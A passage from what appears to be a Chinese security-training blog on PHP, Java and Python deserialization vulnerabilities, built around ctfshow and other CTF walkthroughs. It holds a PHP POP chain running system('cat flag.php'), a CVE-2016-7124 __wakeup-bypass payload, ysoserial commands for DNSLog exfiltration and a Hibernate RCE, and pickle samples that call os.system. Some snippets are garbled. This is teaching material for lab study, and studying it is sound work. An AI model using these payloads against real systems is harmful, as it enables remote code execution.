class="title">echo</span> <span class="title">serialize</span>($<span class="title">b</span>)</span></span><br><span class="line"><span class="class">?&gt;</span></span><br><span class="line"><span class="class">思路：分析代码并没有输出<span class="title">flag</span>的地方，但是存在<span class="title">eval</span>()函数,此函数在反序列化中常被用来<span class="title">RCE</span>，</span></span><br><span class="line"><span class="class">因此试图构造<span class="title">pop</span>链--</span></span><br><span class="line"><span class="class">首先通过<span class="title">new</span> 对象来调用<span class="title">__construct</span>()魔术方法</span></span><br><span class="line"><span class="class">--通过魔术方法调用<span class="title">backDoor</span>方法（此处要修改<span class="title">class</span>的值为<span class="title">bankDoor</span>）</span></span><br><span class="line"><span class="class">--修改<span class="title">class</span>=<span class="title">new</span> <span class="title">backDoor</span>();（因为<span class="title">backDoor</span>中$<span class="title">code</span>为私有所以需要新建 <span class="title">backDoor</span>才能调用）</span></span><br><span class="line"><span class="class">--然后修改$<span class="title">code</span>的变量值为&quot;<span class="title">system</span>(&quot;<span class="title">cat</span> <span class="title">flag</span>.<span class="title">php</span>&quot;);&quot;;构造完成</span></span><br><span class="line"><span class="class">--传入正确的参数，修改数据包中<span class="title">cookie</span>字段反序列化<span class="title">RCE</span>执行</span></span><br></pre></td></tr></table></figure>

<h6 id="258-反序列化参数修改-对象调用逻辑"><a href="#258-反序列化参数修改-对象调用逻辑" class="headerlink" title="258-反序列化参数修改&amp;对象调用逻辑"></a>258-反序列化参数修改&amp;对象调用逻辑</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">思路：代码逻辑基本和上一关相似，只是增加了正则过滤,通过替换语句将数字替换成+数字，即可绕过。</span><br><span class="line">比如原来序列化后的对象中含有<span class="number">8</span>，替换为+<span class="number">8</span></span><br><span class="line">/[oc]:\d+:/i，其中 / 表示正则表达式的开始和结束，[oc] 表示匹配字符集中的一个字符，</span><br><span class="line">即 o 或 c，\d+ 表示匹配一个或多个数字字符，即 <span class="number">0</span> 到 <span class="number">9</span>，: 表示匹配冒号字符。</span><br><span class="line">因此，该正则表达式的含义是匹配以 o: 或 c: 开头、后面跟着一串数字和冒号的字符串。</span><br><span class="line">i 表示忽略大小写，即 o 和 c 可以是大写或小写字母。</span><br></pre></td></tr></table></figure>

<h6 id="259-原生态类8Call魔术方法8配台SSRF"><a href="#259-原生态类8Call魔术方法8配台SSRF" class="headerlink" title="259-原生态类8Call魔术方法8配台SSRF"></a>259-原生态类8Call魔术方法8配台SSRF</h6><p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qing_chuan_/article/details/134112559?utm_medium=distribute.pc_relevant.none-task-blog-2defaultbaidujs_baidulandingword~default-0-134112559-blog-122018007.235v40pc_relevant_3m_sort_dl_base1&spm=1001.2101.3001.4242.1&utm_relevant_index=3">https://blog.csdn.net/qing_chuan_/article/details/134112559?utm_medium=distribute.pc_relevant.none-task-blog-2defaultbaidujs_baidulandingword~default-0-134112559-blog-122018007.235v40pc_relevant_3m_sort_dl_base1&amp;spm=1001.2101.3001.4242.1&amp;utm_relevant_index=3</a><br>思路：大概是观察给出的js代码和flag.php 发现存在一个没有被调用的函数，所以想到用php中的原生类调用。<br>目的是在index.php通过反序列化一个原生类向flag.php发送请求，然后flag.php用file_put_contents把flag放到flag.txt里。发请求用的是php里的一个内置类：SoapClient,这个类中有个__call魔术方法,当调用一个对象中不存在的方法时候，会执行call()魔术方法。来达到我们伪造请求头的目的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctfshow的大部分php反序列题目我也都做了，可以直接去看写的wp文章可能会更详细一点。</span><br></pre></td></tr></table></figure>

<h1 id="第46天：WEB攻防-通用漏洞-PHP反序列化-原生类-漏洞绕过-公私有属性"><a href="#第46天：WEB攻防-通用漏洞-PHP反序列化-原生类-漏洞绕过-公私有属性" class="headerlink" title="第46天：WEB攻防-通用漏洞&amp;PHP反序列化&amp;原生类&amp;漏洞绕过&amp;公私有属性"></a>第46天：WEB攻防-通用漏洞&amp;PHP反序列化&amp;原生类&amp;漏洞绕过&amp;公私有属性</h1><h4 id="知识点：-26"><a href="#知识点：-26" class="headerlink" title="知识点："></a>知识点：</h4><p>1、反序列化魔术方法全解<br>2、反序列化变量属性全解<br>3、反序列化魔术方法原生类<br>4、反序列化语言特性漏洞绕过</p>
<p>~其他魔术方法</p>
<p>共有&amp;私有&amp;保护<br>语言模式方法漏洞<br>~原生类获取利用配合</p>
<h4 id="反序列化利用大概分类三类"><a href="#反序列化利用大概分类三类" class="headerlink" title="#反序列化利用大概分类三类"></a>#反序列化利用大概分类三类</h4><p>-魔术方法的调用逻辑如触发条件<br>-语言原生类的调用逻辑如SoapClient<br>-语言自身的安全缺陷如CVE-2016-7124</p>
<h4 id="反序列化课程点：-1"><a href="#反序列化课程点：-1" class="headerlink" title="#反序列化课程点："></a>#反序列化课程点：</h4><p>-PHP&amp;Java&amp;Python</p>
<p>PHP魔术方法再来一遍</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">__construct</span>():<span class="comment">//构造函数，当对象new的时候会自动调用</span></span><br><span class="line"><span class="title function_ invoke__">__destruct</span>():<span class="comment">//析构函数当对象被销毁时会被自动调用</span></span><br><span class="line"><span class="title function_ invoke__">__wakeup</span>():<span class="comment">//unserialize()时会被自动调用</span></span><br><span class="line"><span class="title function_ invoke__">__invoke</span>(): <span class="comment">//当尝试以调用函数的方法调用一个对象时，会被自动调用</span></span><br><span class="line"><span class="title function_ invoke__">__call</span>(): <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__callStatci</span>(): <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line"><span class="title function_ invoke__">__get</span>(): <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line"><span class="title function_ invoke__">__set</span>(): <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line"><span class="title function_ invoke__">__isset</span>(): <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line"><span class="title function_ invoke__">__unset</span>(): <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line"><span class="title function_ invoke__">__toString</span>(): <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line"><span class="title function_ invoke__">__sleep</span>(): <span class="comment">//serialize()函数会检查类中是否存在一个魔术方法__sleep() 如果存在，该方法会被优先调用</span></span><br></pre></td></tr></table></figure>

<h4 id="演示案例：-23"><a href="#演示案例：-23" class="headerlink" title="演示案例："></a>演示案例：</h4><p>方法&amp;属性-调用详解&amp;变量数据详解<br>CTF-语言漏洞-wakeup方法绕过<br>CTF-方法原生类获取&amp;利用&amp;配合其他</p>
<h4 id="方法-属性-调用详解-变量数据详解"><a href="#方法-属性-调用详解-变量数据详解" class="headerlink" title="#方法&amp;属性-调用详解&amp;变量数据详解"></a>#方法&amp;属性-调用详解&amp;变量数据详解</h4><p>对象变量属性：<br>public（公共的）在本类内部、外部类、子类都可以访问<br>protect（受保护的）只有本类或子类或父类中可以访问<br>private(私人的）只有本类内部可以使用<br>序列化数据显示：<br>private属性序列化的时候格式是%00类名%00成员名<br>protect属性序列化的时候格式是%00*%00成员名</p>
<h4 id="CTF语言漏洞-wakeup（）方法绕过"><a href="#CTF语言漏洞-wakeup（）方法绕过" class="headerlink" title="#CTF语言漏洞-wakeup（）方法绕过"></a>#CTF语言漏洞-wakeup（）方法绕过</h4><p>极客大挑战20191 PHP CVE2016-7124</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">如果存在wakeup方法，调用<span class="title function_ invoke__">unserilize</span>(O方法前则先调用wakeup方法，</span><br><span class="line">但是序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过wakeup的执行</span><br><span class="line"><span class="number">1</span>、下载源码分析，触发flag条件</span><br><span class="line"><span class="number">2</span>、分析会缺发调用wakeup强制username值</span><br><span class="line"><span class="number">3</span>、利用语言漏洞绕过CVE-<span class="number">2016</span>-<span class="number">7124</span></span><br><span class="line"><span class="number">4</span>、构造payload后修改满足漏洞条件发</span><br><span class="line">Pyload</span><br><span class="line">select=<span class="number">0</span>%<span class="number">3</span>A4%<span class="number">3</span>A<span class="string">&quot;Name&quot;</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A14%<span class="number">3</span>A%<span class="number">00</span>Name%<span class="number">00</span>username<span class="string">&quot;%3Bs</span></span><br><span class="line"><span class="string">%3A5%3A&quot;</span>admin<span class="string">&quot;%3Bs%3A14%3A%00Name%00password&quot;</span>%<span class="number">3</span>Bi%<span class="number">3</span>A100%<span class="number">3</span>B%<span class="number">7</span>D</span><br><span class="line"></span><br><span class="line">思路：通过文件目录扫描出www.zip文件，文件中含有网站源代码，观察网站源码发现要想获得flag需要</span><br><span class="line">password=<span class="number">100</span>&amp;username=admin，同时并未给出传参的位置，</span><br><span class="line">所以需要利用反序列化构造username和password，</span><br><span class="line">但是在利用<span class="title function_ invoke__">unserialize</span>()函数的时候会自动调用<span class="title function_ invoke__">__wakeup</span>()魔术方面把username修改，</span><br><span class="line">所以思考要跳过<span class="title function_ invoke__">__wakeiup</span>()魔术方法，就需要利用CVE-<span class="number">2016</span>-<span class="number">7124</span>漏洞。</span><br><span class="line">影响版本：PHP5 &lt; <span class="number">5.6</span>.<span class="number">25</span>；PHP7 &lt; <span class="number">7.0</span>.<span class="number">10</span></span><br><span class="line">漏洞原因：如果存在__wakeup方法，调用 <span class="title function_ invoke__">unserilize</span>() 方法前则先调用__wakeup方法，</span><br><span class="line">但是序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行。</span><br><span class="line">构造链：</span><br><span class="line">&lt;?php</span><br><span class="line">	<span class="keyword">class</span> Name&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;100&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Name</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">输出结果后修改属性个数大于真实属性个数即可，然后传参带入即可。</span><br></pre></td></tr></table></figure>

<h4 id="CTF-方法原生类获取-利用-配合其他"><a href="#CTF-方法原生类获取-利用-配合其他" class="headerlink" title="CTF-方法原生类获取&amp;利用&amp;配合其他"></a>CTF-方法原生类获取&amp;利用&amp;配合其他</h4><h5 id="此处回顾了ctfshow-259关"><a href="#此处回顾了ctfshow-259关" class="headerlink" title="此处回顾了ctfshow 259关"></a>此处回顾了ctfshow 259关</h5><p>对于这个原生类的知识，主要是从一下三个方面去说明。<br>-PHP有那些原生类-见脚本使用<br>-常见使用的原生类-见参考案例<br>-原生类该怎么使用-见官方说明<br>首先通过网上找的一个小脚本，可以列出每个魔术方法对应的一些原生类。<br>直接访问即可返回原生类（但不全）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line"><span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="keyword">array</span>(</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line"></span><br><span class="line">))) &#123;</span><br><span class="line"><span class="keyword">print</span> <span class="variable">$class</span> . <span class="string">&#x27;::&#x27;</span> . <span class="variable">$method</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;&#125;&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>本地dome xss</strong></p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/264823">https://www.anquanke.com/post/id/264823</a><br>思路：通过分析代码传入参数k，最后直接输出对象，此处可以使用__tostring魔术方法，但是代码中并没包含__tostring的对象，所以想到要使用原生类</p>
<h6 id="回顾ctfshow259-利用原生类"><a href="#回顾ctfshow259-利用原生类" class="headerlink" title="回顾ctfshow259 利用原生类"></a><strong>回顾ctfshow259 利用原生类</strong></h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">思路：分析代码存在不存在的函数方法所以i想到利用<span class="title function_ invoke__">__call</span>()魔术方法触发，</span><br><span class="line">但是代码中没有<span class="title function_ invoke__">__call</span>()魔术方法，所以想到使用含有魔术方法的原生类<span class="title function_ invoke__">soapClient</span>()访问flag.php讲flag写入flag.txt，最后读取即可。</span><br><span class="line">flag.php中表明需要本地访问且ua头有限制token=ctfshow方可写入。</span><br></pre></td></tr></table></figure>

<p>将构造的好的链通过参数传入即可将falg写入flag.txt，最后读取flag.txt</p>
<h1 id="第47天-WEB攻防-通用漏洞-Java反序列化-EXP生成-数据提取-组件安全"><a href="#第47天-WEB攻防-通用漏洞-Java反序列化-EXP生成-数据提取-组件安全" class="headerlink" title="第47天 WEB攻防-通用漏洞&amp;Java反序列化&amp;EXP生成&amp;数据提取&amp;组件安全"></a>第47天 WEB攻防-通用漏洞&amp;Java反序列化&amp;EXP生成&amp;数据提取&amp;组件安全</h1><h4 id="知识点：-27"><a href="#知识点：-27" class="headerlink" title="知识点："></a>知识点：</h4><p>1、Java反序列化演示-原生API接☐<br>2、Java反序列化漏洞利用-Ysoserial使用<br>3、Java反序列化漏洞发现利用点-函数&amp;数据<br>4、Java反序列化考点-真实&amp;CTF赛题-审计分析</p>
<h4 id="内容点："><a href="#内容点：" class="headerlink" title="#内容点："></a>#内容点：</h4><p>1、明白Java反序列化原理<br>2、判断Java反序列化漏洞<br>3、学会-Ysoserial_工具使用<br>4、学会-SerializationDumper<br>5、了解-简要Java代码审计分析</p>
<h4 id="前置知识"><a href="#前置知识" class="headerlink" title="#前置知识"></a>#前置知识</h4><p>序列化和反序列化的概念：<br>序列化：把Java对象转换为字节序列的过程。<br>反序列化：把字节序列恢复为Java对象的过程。<br>对象的序列化主要有两种用途：<br>把对象的字节序列永久地保存到硬盘上，通常存放在一个文件中；（持久化对象）<br>在网络上传送对象的字节序列。（网络传输对象）</p>
<blockquote>
<p>尽管 Java 反序列化和 PHP 反序列化在处理对象的序列化和反序列化过程中都存在类似的安全问题，但它们之间还是有一些不同的地方：<br>序列化格式不同：Java 使用了自己的序列化机制来支持对象的序列化和反序列化，而 PHP 通常使用基于文本的序列化格式（如<br>serialize 和 unserialize 函数）进行序列化和反序列化。 序列化器实现方式不同：Java 序列化器实现了<br>Serializable 接口，并通过反射机制获取对象的属性值进行序列化。而 PHP 序列化器没有统一的接口，而是通过魔术方法（如<br>__sleep() 和 __wakeup()）和自定义函数进行序列化和反序列化。 对象类型的检查方式不同：Java 反序列化将对反序列化的对象进行类型检查，并且只会反序列化已知类型的对象。<br>PHP的反序列化器则没有这样的限制，攻击者可以构造序列化数据来欺骗反序列化器。 可重写方法的触发方式不同：Java 反序列化器通过特定的方法（例如readObject()）来触发可重写方法，而 PHP 反序列化器需要在序列化字符串中包含 O:classname: 格式的元信息来实现。<br>综上所述，虽然 Java 反序列化和 PHP 反序列化存在一些不同，但它们都必须小心处理反序列化的输入数据，以避免导致安全漏洞。函数接口：</p>
</blockquote>
<h4 id="函数接口："><a href="#函数接口：" class="headerlink" title="函数接口："></a>函数接口：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Java:Serializable Extemalizable接☐、fastjson、jackson、gson、</span><br><span class="line">ObjectInputStream.read,ObjectobjectInputStream.readUnshared,XMLDecoder.read.</span><br><span class="line">ObjectYaml.loadXStream.fromXML.ObjectMapper.readValue.JSON.parseObject</span><br><span class="line">PHP:serialize(）unserialize(）</span><br><span class="line">Python:pickle</span><br></pre></td></tr></table></figure>

<h4 id="数据出现："><a href="#数据出现：" class="headerlink" title="数据出现："></a>数据出现：</h4><p>1、功能特性：<br>反序列化操作一般应用在导入模板文件、网例络通信、数据传输、日志格式化存储、对象数<br>据落磁盘、或DB存储等业务场景。因此审计过程中重点关注这些功能板块。<br>2、数据特性：<br>一段数据以rO0AB开头，你基本可以确定这串就是JAVA序列化base64加密的数据。<br>或者如果以aced开头，那么他就是这一段java序列化的16进制。<br>3、出现具体：<br>http参数，cookie,sesion,存储方式可能是base64(rO0)，压缩后的base64(H4s),Mll等<br>Servlets http,Sockets,Session管理器，包含的协议就包括：JMX,RMl,JMS,JND1等<br>(\xac\Xed)xm IXstream,XmldEcoder (http Body:Content-type:application&#x2F;xml)<br>json0 ackson,fastison)http请求中包含</p>
<h4 id="发现："><a href="#发现：" class="headerlink" title="发现："></a>发现：</h4><p>黑盒分析：数据库出现地-观察数据特性<br>白盒分析：组件安全&amp;数搜索&amp;功能模块<br>利用：<br>Ysoserials集成的jar包配合生成，特性的专业漏洞利用工具等</p>
<h4 id="演示案例：-24"><a href="#演示案例：-24" class="headerlink" title="演示案例："></a>演示案例：</h4><p>原生API -Ysoserial URLDNS使用<br>三方组件-Ysoserial支持库生成使用<br>解密分析-SerializationDumper数据分析<br>CTF赛题-[网鼎杯2020朱雀组]ThinkJava</p>
<h4 id="原生API-Ysoserial-URLDNS使用"><a href="#原生API-Ysoserial-URLDNS使用" class="headerlink" title="#原生API-Ysoserial URLDNS使用"></a>#原生API-Ysoserial URLDNS使用</h4><p>Serializable接口<br>Externalizable接口<br>没组件生成DNS利用：<br><a target="_blank" rel="noopener" href="https://github/com/frohoff">https://github/com/frohoff</a> ysoserial<br>java -jar ysoserial-0.0.6-SNAPSHOT-all jar URLDNS <a target="_blank" rel="noopener" href="http://9ar7xl/">http://9ar7xl</a> anslog.cn”&gt;urldns.ser<br>思路：本地搭建序列化和反序列化操作，使用ysoserial 生成反序列化语句用来访问dnslog并保存到本地，当反序列化执行的对象为构造好的本地文件时，触发访问dnslog，造成信息外带。</p>
<h4 id="三方组件-Ysoserial支持库生成便用"><a href="#三方组件-Ysoserial支持库生成便用" class="headerlink" title="#三方组件-Ysoserial支持库生成便用"></a>#三方组件-Ysoserial支持库生成便用</h4><p><a target="_blank" rel="noopener" href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a><br>此处讲解了wegooat靶场中Java反序列化关卡，首先通过抓包找到含有反序列化函数处，然后有两种，第一种结合原生类（比如 URLDNS）生成payload，第二种结合原生类hibernate生成payload（结合库文件生成的一般可以执行rce）</p>
<p>先结合库文件利用jar包生成特定payload，此处是利用hibemnate生成了弹出计算器的payload并保存到本地，然后将payload进行base64加密。</p>
<p>有组件生成RCE1、生成：java-Dhibernate5 cp hibemnate-core-5.4.9 Final jar ysoserial-0.0.6-<br>SNAPSHOT-all jar ysoseral.GeneratePayload Hibernate1 “calc.exe”&gt;x bin<br>2、解码：python java.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">file <span class="built_in">open</span>(“x <span class="built_in">bin</span>”“rb”)</span><br><span class="line">now flle read（）</span><br><span class="line">ba base64 D64encode(now)</span><br><span class="line"><span class="built_in">print</span> ba</span><br><span class="line">file close</span><br></pre></td></tr></table></figure>

<p>3、CTF赛题—[网鼎杯2020朱雀组]ThinkJava</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/h3zh1/p/12914439.html">https://www.cnblogs.com/h3zh1/p/12914439.html</a></p>
<p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/RABCDXB/article/details/124003575">https://blog.csdn.net/RABCDXB/article/details/124003575</a></p>
<h1 id="第48天：WEB攻防-通用漏洞-Py反序列化-链构造-自动审计bandit-魔术方法"><a href="#第48天：WEB攻防-通用漏洞-Py反序列化-链构造-自动审计bandit-魔术方法" class="headerlink" title="第48天：WEB攻防-通用漏洞&amp;Py反序列化&amp;链构造&amp;自动审计bandit&amp;魔术方法"></a>第48天：WEB攻防-通用漏洞&amp;Py反序列化&amp;链构造&amp;自动审计bandit&amp;魔术方法</h1><h4 id="知识点：-28"><a href="#知识点：-28" class="headerlink" title="知识点："></a>知识点：</h4><p>1、Python-反序列化函数使用<br>2、Python-反序列化魔术方法<br>3、Python-反序列化POP链构造<br>4、Python-自动化审计bandit使用</p>
<h4 id="前置知识：-1"><a href="#前置知识：-1" class="headerlink" title="#前置知识："></a>#前置知识：</h4><p>函数使用：<br>pickle.dump(obj,file):将对象序列化后保存到文件<br>pickle.load(le):读取文件，将文件中的序列化内容反序列化为对象<br>pickle.dumps(obj):将对象序列化成字符串格式的字节流<br>pickle.loads(bytes obj):将字符串格式的字节流反序列化为对象<br>魔术方法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__reduce (__()      反序列化时调用</span><br><span class="line">__reduce__ex__()    反序列化时调用</span><br><span class="line">__setstate__()      反序列化时调用</span><br><span class="line">__getstate__()    序列化时调用</span><br></pre></td></tr></table></figure>

<p>各类语言函数：<br>Java:Serializable Extemalizable接☐、fastison、jackson、gson、<br>ObjectInputStream.read,ObjectobjectInputStream.readUnshared,XMLDecoder.read.<br>ObjectYaml loadXStream.fromXML ObjectMapper.readValue.JSON.parseObject<br>PHP:serialize（）.unserialize（）<br>Python:pickle marshal PyYAML shelve PIL unzip</p>
<h4 id="演示案例：-25"><a href="#演示案例：-25" class="headerlink" title="演示案例："></a>演示案例：</h4><p>原理-反序列化魔术方法-调用理解<br>CTF-反序列化漏洞利用-构造&amp;RCE<br>CTF-CISCN2019华北-JWT&amp;反序列化<br>代码审计-自动化工具-bandit?安装及使用</p>
<h4 id="原理反序列化魔术方法调用理解"><a href="#原理反序列化魔术方法调用理解" class="headerlink" title="#原理反序列化魔术方法调用理解"></a>#原理反序列化魔术方法调用理解</h4><p>魔术方法利用：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">reduce() 反序列化时调用</span><br><span class="line">reduce_ex() 反序列化时调用</span><br><span class="line">setstate() 反序列化时调用</span><br><span class="line">getstate() 序列化时调用</span><br></pre></td></tr></table></figure>

<p>代码块：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment">#反序列化魔术方法调用-__reduce__() __reduce_ex__() __setstate__()</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;反序列化调用&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> (os.system,(<span class="string">&#x27;calc&#x27;</span>,))</span><br><span class="line">a = A()</span><br><span class="line">p_a = pickle.dumps(a)</span><br><span class="line">pickle.loads(p_a)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;==========&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(p_a)</span><br><span class="line"><span class="comment">##__reduce__()方法在序列化和反序列化时都会被调用，其中__reduce__()方法中需要return才能触发。</span></span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SerializePerson</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">    <span class="comment"># 构造 __setstate__ 方法</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__setstate__</span>(<span class="params">self, name</span>):</span><br><span class="line">        os.system(<span class="string">&#x27;calc&#x27;</span>)  <span class="comment"># 恶意代码</span></span><br><span class="line">tmp = pickle.dumps(SerializePerson(<span class="string">&#x27;tom&#x27;</span>))  <span class="comment">#序列化</span></span><br><span class="line">pickle.loads(tmp)  <span class="comment"># 反序列化 此时会弹出计算器</span></span><br><span class="line">反序列化时会调用__setstate__（）方法，__init__() 方法是一个构造函数，它会在创建新对象时自动调用，</span><br><span class="line">并用于初始化对象的状态和成员变量。当我们创建一个类的新实例时，</span><br><span class="line">Python 解释器会自动调用该类的 __init__() 方法，并将实例本身作为第一个参数传递给该方法。</span><br><span class="line">因此，在定义 __init__() 方法时，需要将该方法的第一个参数指定为 self，以便引用当前对象的成员变量。</span><br></pre></td></tr></table></figure>

<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#序列化魔术方法调用-__getstate__</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__getstate__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;序列化调用&#x27;</span>)</span><br><span class="line">        os.system(<span class="string">&#x27;calc&#x27;</span>)</span><br><span class="line">a = 